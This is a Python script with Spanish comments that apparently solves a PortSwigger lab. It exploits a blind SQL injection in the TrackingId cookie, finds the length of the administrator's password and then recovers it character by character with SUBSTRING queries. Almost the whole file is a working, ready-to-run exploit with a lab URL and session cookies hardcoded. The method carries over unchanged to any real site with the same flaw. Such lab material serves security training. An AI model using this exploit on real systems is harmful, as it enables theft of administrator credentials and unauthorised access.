#!/usr/bin/env python3
"""
Extrae la contraseña del usuario 'administrator' explotando una
Blind SQL Injection con respuestas condicionales (lab de PortSwigger).

IDEA: usamos el "semáforo" -> si la consulta devuelve fila, la pagina
muestra "Welcome back". Preguntando letra a letra con SUBSTRING, sacamos
la contraseña entera.

USO: solo en el laboratorio o con autorizacion. Ejecutar en Kali:
    python3 extraer_password_blind.py

Si el lab se reinicia, actualiza LAB, SESSION y TRACKING con los valores
nuevos que veas en Burp (cabecera Cookie de la peticion GET /).
"""
import string
import sys

try:
    import requests
except ImportError:
    sys.exit("Falta 'requests'. Instala con: pip install requests  (o: sudo apt install python3-requests)")

# ----- CONFIGURA ESTO (copialo de Burp si cambia el lab) -----
LAB      = "https://0acb008703862bbc80cf8a3700cb00f6.web-security-academy.net"
SESSION  = "0007ZQJXrAM83lDMYz020TKRwvR7bllG"
TRACKING = "a5wujbR7musoy7v0"
# -------------------------------------------------------------

SENAL = "Welcome back"                         # el semaforo: si aparece, la condicion es verdadera
CHARS = string.ascii_lowercase + string.digits # letras minusculas + numeros (lo tipico en estos labs)


def verdad(condicion):
    """True si la condicion SQL es verdadera (aparece 'Welcome back')."""
    # Metemos la inyeccion en el valor de la cookie TrackingId.
    # El '-- ' comenta el resto de la consulta (la comilla que anade la web).
    cookie = f"TrackingId={TRACKING}' AND {condicion}-- ; session={SESSION}"
    r = requests.get(LAB + "/", headers={"Cookie": cookie}, timeout=15)
    return SENAL in r.text


def main():
    print("[*] Comprobando el objetivo...")
    if not verdad("1=1"):
        sys.exit("[!] El semaforo no responde. Revisa LAB / SESSION / TRACKING (el lab pudo reiniciarse).")
    print("[+] Semaforo OK (1=1 -> Welcome back).")

    # 1) Longitud de la contrasena
    print("[*] Buscando la longitud de la contrasena...")
    longitud = None
    for n in range(1, 60):
        cond = f"(SELECT LENGTH(password) FROM users WHERE username='administrator')>{n}"
        if not verdad(cond):
            longitud = n
            break
    if not longitud:
        sys.exit("[!] No pude determinar la longitud.")
    print(f"[+] Longitud = {longitud} caracteres.")

    # 2) Extraer caracter a caracter
    print("[*] Extrayendo la contrasena (paciencia, unos segundos)...")
    password = ""
    for pos in range(1, longitud + 1):
        encontrado = False
        for c in CHARS:
            cond = (f"(SELECT SUBSTRING(password,{pos},1) "
                    f"FROM users WHERE username='administrator')='{c}'")
            if verdad(cond):
                password += c
                print(f"    [{pos:>2}/{longitud}]  {password}")
                encontrado = True
                break
        if not encontrado:
            password += "?"
            print(f"    [{pos:>2}/{longitud}]  {password}  (no encontrado en el charset)")

    print("\n" + "=" * 50)
    print(f"  CONTRASENA de 'administrator': {password}")
    print("=" * 50)
    print("\nAhora entra en el lab -> 'My account' -> login:")
    print(f"  usuario:    administrator")
    print(f"  contrasena: {password}")


if __name__ == "__main__":
    main()
